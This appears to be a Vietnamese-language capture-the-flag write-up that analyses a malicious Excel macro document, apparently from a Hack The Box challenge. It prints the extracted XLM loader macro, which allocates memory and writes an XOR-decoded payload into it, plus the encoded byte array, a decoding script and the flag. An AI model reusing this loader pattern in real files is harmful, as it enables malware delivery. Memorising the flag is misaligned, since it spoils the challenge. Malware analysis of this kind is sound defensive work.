### Description 
> Intergalactic Federation stated that it managed to prevent a large-scale phishing campaign that targeted all space personnel across the galaxy. The enemy&#039;s goal was to add as many spaceships to their space-botnet as possible so they can conduct distributed destruction of intergalactic services (DDOIS) using their fleet. Since such a campaign can be easily detected and prevented, malicious actors have changed their tactics. As stated by officials, a new spear phishing campaign is underway aiming high value targets. Now Klaus asks your opinion about a mail it received from &quot;sales@unlockyourmind.gal&quot;, claiming that in their galaxy it is possible to recover it&#039;s memory back by following the steps contained in the attached file.

### Solution 
- Challenge cung cấp cho chúng ta 1 file excel chứa macro, tuy nhiên khi check bằng olevba thì không có gì.
- ![image](https://hackmd.io/_uploads/BJ_dBPpzyg.png)
- ![image](https://hackmd.io/_uploads/B1PwHw6MJl.png)
-  Mở trực tiếp trên máy ảo, ta thấy file này có 2 sheet.
-  Tại sheet macro1 có vài điểm rất đáng ngờ, có 1 vài lệnh gọi các thư viện từ hệ thống 
-  ![image](https://hackmd.io/_uploads/S1jz8vpzyx.png)
- Dùng 7z để extract tất cả các file có liên quan ra.
- ![image](https://hackmd.io/_uploads/BJyPUDpzJx.png)
- Đọc file vào xl/macrosheets/sheet1.xml ta thấy tất cả các mã macro đều nằm trong cặp <f></f> nên ta sử dụng strings + grep để lấy ra
- ![image](https://hackmd.io/_uploads/ByHePPafke.png)
```
┌──(kali㉿kali)-[~/Downloads/xl/macrosheets]
└─$ grep -oP '(?<=<f>)(.*?)(?=</f>)' sheet1.xml
SELECT(E1:G258)
CALL("Kernel32","VirtualAlloc","JJJJJ",0,386,4096,64)
SET.VALUE(C1, 0)
FOR("counter",0,772,2)
SET.VALUE(B1,CHAR(_xlfn.BITXOR(ACTIVE.CELL(),24)))
CALL("Kernel32","WriteProcessMemory","JJJCJJ",-1, A2 + C1,Β1, LEN(Β1), 0)
SET.VALUE(C1, C1 + 1)
SELECT(, "RC[2]")
NEXT()
WORKBOOK.ACTIVATE("Sheet1")

```
- Đọc nó, ta thấy đoạn mã sử dụng các giá trị từ ô E1 đến ô G258 trong sheet sau đó xor với 24 với bước nhảy là 2. Và cuối cùng là ghi data này vào memory.
- Oke, bây giờ tiến hành xử lý từng bước.
- ![image](https://hackmd.io/_uploads/BJ15_w6Gyg.png)
- Sử dụng word để định dạng nó lại 1 chút
- ![image](https://hackmd.io/_uploads/ByC7KPTGJe.png)
- ![image](https://hackmd.io/_uploads/SkmHtwazyl.png)
- ![image](https://hackmd.io/_uploads/SJ-LFv6fkg.png)
- Tiếp theo là viết script python để lấy dữ liệu ra 
```
array = [228,54,240,244,154,233,24,216,24,9,24,172,120,252,145,15,253,103,41,52,216,214,124,244,147,90,72,198,40,53,147,70,74,93,20,118,147,240,74,88,12,91,147,224,106,217,48,114,23,217,175,22,82,188,62,217,41,191,231,130,180,150,36,18,121,235,100,52,26,39,52,99,56,231,217,29,215,212,21,77,25,70,223,58,250,130,234,247,74,183,79,8,147,196,74,207,8,147,147,221,82,111,36,212,147,24,84,57,9,21,96,90,251,186,80,23,25,29,201,163,73,89,147,39,65,52,56,79,25,250,203,45,147,245,81,57,0,194,251,105,34,130,81,176,147,95,44,156,147,108,25,122,206,187,41,40,231,211,180,34,217,244,215,235,21,61,25,146,223,113,32,238,248,39,109,247,238,137,27,205,101,61,224,27,35,156,101,40,60,88,109,241,252,109,64,211,147,104,64,202,60,190,25,194,203,28,126,168,147,121,20,239,83,255,147,175,64,158,4,157,25,125,203,139,147,78,28,32,147,126,25,72,200,228,145,103,92,103,60,254,60,12,67,151,67,134,121,48,65,92,66,244,73,163,231,146,248,121,71,35,71,53,66,79,147,219,10,153,243,74,149,217,69,120,114,172,25,6,149,246,157,176,170,245,24,217,24,119,24,163,72,95,112,127,41,153,147,72,119,147,159,202,231,251,205,27,163,56,232,179,173,96,186,25,78,9,112,255,190,173,141,103,165,169,133,54,231,63,205,144,36,219,30,250,100,120,18,240,152,183,227,103,248,110,109,47,29,205,163,162,95,175,11,46,106,56,119,199,114,67,24,164,75,12,231,114,205,66,74,73,93,180,95,147,56,79,89,69,92,104,92,177,56,66,58,238,80,160,83,199,84,79,85,70,68,233,75,43,87,54,94,210,76,167,79,30,89,47,74,231,93,111,68,133,85,81,113,64,123,155,106,49,119,54,107,16,119,19,126,148,108,112,68,40,79,123,113,200,118,207,124,56,119,232,111,151,107,235,56,223,86,82,76,154,68,186,91,87,109,75,106,57,106,197,125,139,118,240,108,123,78,169,125,160,106,131,107,132,113,71,119,221,118,193,68,251,81,70,117,105,121,107,127,161,125,64,56,138,94,145,113,94,116,152,125,57,56,86,93,64,96,205,125,44,123,226,109,253,108,23,113,233,119,117,118,251,56,33,87,134,104,170,108,148,113,60,119,215,118,143,107,21,68,233,109,68,108,190,113,181,116,141,117,120,121,132,118,150,54,99,125,217,96,132,125,213,58,227,56,174,55,229,108,67,56,29,74,57,93,2,95,36,71,80,75,154,66,96,56,56,55,146,110,65,56,197,92,243,125,194,122,246,109,3,127,180,127,209,125,123,106,121,56,224,55,243,124,71,56,19,58,142,91,232,34,43,68,16,111,171,113,236,118,25,124,212,119,24,111,78,107,2,68,129,107,113,97,73,107,31,108,183,125,200,117,78,43,234,42,46,68,115,123,76,117,196,124,116,54,135,125,37,96,122,125,156,58,7,56,133,55,79,126,153,35,83,125,118,123,250,112,51,119,160,56,238,58,11,80,62,76,28,90,79,99,48,41,9,107,217,71,27,108,18,112,8,41,10,107,98,71,45,127,135,44,219,116,134,44,126,96,91,97,239,71,150,116,51,40,190,107,216,108,73,71,98,41,30,118,79,71,100,108,66,41,81,117,41,43,144,39,8,39,100,57,150,101,133,58,46,24,187]
for i in range(0, len(array), 2):
	char = int(array[i] ^ 24)
	print(char, end = ' ')
```
- ![image](https://hackmd.io/_uploads/rJxqaFPTGye.png)
> Flag : HTB{1s_th1s_g4l4xy_l0st_1n_t1m3??!}